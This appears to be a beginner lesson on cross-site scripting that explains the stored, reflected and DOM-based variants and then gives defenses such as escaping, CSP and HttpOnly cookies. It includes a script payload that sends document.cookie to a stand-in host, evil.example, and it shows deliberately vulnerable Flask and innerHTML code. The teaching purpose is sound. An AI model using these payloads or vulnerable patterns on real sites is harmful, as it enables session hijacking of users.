# Cross-Site Scripting (XSS)
**Category:** App Security
**Date:** 2026-07-03
**Difficulty:** Beginner

---

## What It Is
Cross-Site Scripting (XSS) occurs when an attacker injects malicious JavaScript into a web page that is then executed in other users' browsers. The browser trusts the script because it appears to come from the legitimate site. There are three main variants: Reflected (payload in the URL), Stored (payload saved in the database), and DOM-based (payload processed entirely in client-side JavaScript).

## Why It Matters
XSS is consistently in the OWASP Top 10 and is one of the most widespread vulnerabilities on the web — the British Airways breach (2018, ~£20M fine) partially involved script injection that silently skimmed 500,000 customers' payment card details from the checkout page. A single XSS flaw can compromise every user who visits the affected page.

## Practical Example

### Stored XSS — Comment Box Attack

Imagine a blog that saves user comments without sanitization:

```python
# Vulnerable Flask route
@app.route("/comment", methods=["POST"])
def post_comment():
    comment = request.form["comment"]          # raw, unsanitized
    db.execute("INSERT INTO comments VALUES (?)", (comment,))
    return redirect("/")

# Rendered in the template (Jinja2, auto-escape OFF):
# {{ comment | safe }}   ← "safe" disables escaping — NEVER do this
```

An attacker submits this as their "comment":

```html
<script>
  fetch("https://evil.example/steal?c=" + document.cookie);
</script>
```

When any visitor loads the page, their browser executes the script, silently sending their session cookie to the attacker. The attacker can then hijack the session entirely.

### Reflected XSS — Search Parameter

```
https://shop.example/search?q=<script>alert(document.cookie)</script>
```

If the server echoes `q` directly into the HTML response without escaping, every user tricked into clicking the link runs the payload in their browser.

### DOM-Based XSS — Client-Side Sink

```javascript
// Vulnerable
const query = new URLSearchParams(window.location.search).get("name");
document.getElementById("greeting").innerHTML = "Hello, " + query; // sink: innerHTML
```

No server involvement needed — the payload travels entirely in the URL fragment and is executed by the victim's own browser.

## How to Defend

- **Escape output by default.** Use a templating engine with auto-escaping enabled (Jinja2 `autoescape=True`, React's JSX, Django templates). Never use `innerHTML`, `document.write`, or `eval` with user-controlled data.
- **Implement a Content Security Policy (CSP).** A strict CSP (`Content-Security-Policy: default-src 'self'; script-src 'self'`) blocks inline scripts and restricts where scripts can load from, limiting blast radius even if injection occurs.
- **Use `HttpOnly` and `Secure` cookie flags.** `HttpOnly` prevents JavaScript from reading session cookies at all, breaking the most common XSS payloads.
- **Validate and sanitize rich input.** If you must allow HTML (e.g., a WYSIWYG editor), use a battle-tested HTML sanitizer like DOMPurify — never write your own allowlist parser.
- **Adopt modern frameworks.** React, Vue, and Angular escape dynamic content by default. Avoid the escape hatches (`dangerouslySetInnerHTML`, `v-html`) unless absolutely necessary and with validated, sanitized input.

## Today's Challenge

1. **Audit your own project:** Search your codebase for any use of `innerHTML`, `document.write`, `dangerouslySetInnerHTML`, or `| safe` (Jinja2). For each hit, ask: is the value user-controlled? If yes, switch to a safe alternative (`textContent`, escaped rendering).
2. **Try it live (safely):** Spin up [DVWA](https://github.com/digininja/DVWA) or use the free [XSS challenges on PortSwigger Web Security Academy](https://portswigger.net/web-security/cross-site-scripting). Solve the first "Reflected XSS" lab — it takes under 10 minutes and makes the attack click concretely.
3. **Add a CSP header** to any personal project you run and verify it with the [CSP Evaluator](https://csp-evaluator.withgoogle.com/).

## Key Takeaway
XSS turns your site into an attacker's delivery mechanism — the fix is simple: **never trust user input and always escape output at the point of rendering**, not at the point of input.
